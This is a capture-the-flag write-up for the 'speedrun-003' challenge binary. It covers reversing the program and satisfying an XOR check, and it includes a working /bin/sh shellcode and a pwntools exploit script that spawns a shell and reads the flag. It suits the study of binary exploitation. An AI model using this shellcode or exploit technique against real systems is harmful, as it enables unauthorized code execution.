# &#35; speedrun-003

#### &#42; files
```bash
## 1 file
$ ls
speedrun-003


$ file speedrun-003
speedrun-003: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6169e4b9b9e1600c79683474c0488c8319fc90cb, not stripped
$ checksec --file=./speedrun-003
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   77) Symbols	  No	0		2	./speedrun-003

```

#### &#42; execute
```bash
## just input, not echo
$ ./speedrun-003
Think you can drift?
Send me your drift
aaaaaaaaaa
You're not ready.

```

#### &#42; reversing
```bash
undefined8 main(void)

{
  char *pcVar1;
  
  setvbuf(stdout,(char *)0x0,2,0);
  pcVar1 = getenv("DEBUG");
  if (pcVar1 == (char *)0x0) {
    alarm(5);
  }
  say_hello();
  get_that_shellcode();
  return 0;
}

void say_hello(void)

{
  puts("Think you can drift?");
  return;
}


void get_that_shellcode(void)

{
  char cVar1;
  char cVar2;
  ssize_t sVar3;
  size_t sVar4;
  char *pcVar5;
  long in_FS_OFFSET;
  char local_38 [15];
  undefined auStack41 [15];
  undefined local_1a;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Send me your drift");
  sVar3 = read(0,local_38,30);
  local_1a = 0;
  if ((int)sVar3 == 30) {
    sVar4 = strlen(local_38);
    if (sVar4 == 0x1e) {
      pcVar5 = strchr(local_38,0x90);
      if (pcVar5 == (char *)0x0) {
        cVar1 = xor(local_38,0xf);
        cVar2 = xor(auStack41,0xf);
        if (cVar1 == cVar2) {
          shellcode_it(local_38,30);
        }
        else {
          puts("This is a special race, come back with better.");
        }
      }
      else {
        puts("Sleeping on the job, you\'re not ready.");
      }
    }
    else {
      puts("You\'re not up to regulation.");
    }
  }
  else {
    puts("You\'re not ready.");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

## try to run payload. => must have to input shellcode to payload.
void shellcode_it(void *param_1,uint param_2)

{
  code *__dest;
  
  __dest = (code *)mmap((void *)0x0,(ulong)param_2,7,0x22,-1,0);
  memcpy(__dest,param_1,(ulong)param_2);
  (*__dest)();
  return;
}

```


#### &#42; structure of stack
```
## shellocde[24] + garbage[6]
## shellcode[15] + shellcode[9] + garbage[6]
## shellcode[15]^0xf == (shellcode[9] + garbage[6])^0xf

```

#### &#42; payload(python)
```bash
payload  = shellocde[24] + garbage[6]

```


#### &#42; how to attack
```
## forward shellcode[15]^0xf
## and
## backward shellcode[15]^0xf
## must to same

$ cat chk-speedrun-003.py
shellcode="\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\xdd\xdd\xdd\xdd\xdd\xd2"
print ("shellcode len : %i" % len(shellcode))

result = 0
for ch in range(15):
	result ^= ord(shellcode[ch])
print ("forward : %i" % result)

result = 0
for ch in range(15, 30):
	result ^= ord(shellcode[ch])
print ("backward : %i" % result)

$ python chk-speedrun-003.py
shellcode len : 30
forward : 205
backward : 205

```


#### &#42; make exploit code
```bash
$ cat exp-speedrun-003.py
from pwn import *

filename="./speedrun-003"
conn = process(filename)

shellcode="\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\xdd\xdd\xdd\xdd\xdd\xd2"

conn.recvline()
conn.recvline()
conn.send(shellcode)

conn.interactive()

```


#### &#42; try to exploit
```bash
$ python exp-speedrun-003.py
[+] Starting local process './speedrun-003': pid 61354
exp-speedrun-003.py:10: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  conn.send(shellcode)
[*] Switching to interactive mode
$ id
uid=0(user) gid=0(user) groups=0(user)
$ cat flag
getted flag successully!!!
[*] Got EOF while reading in interactive
$

```
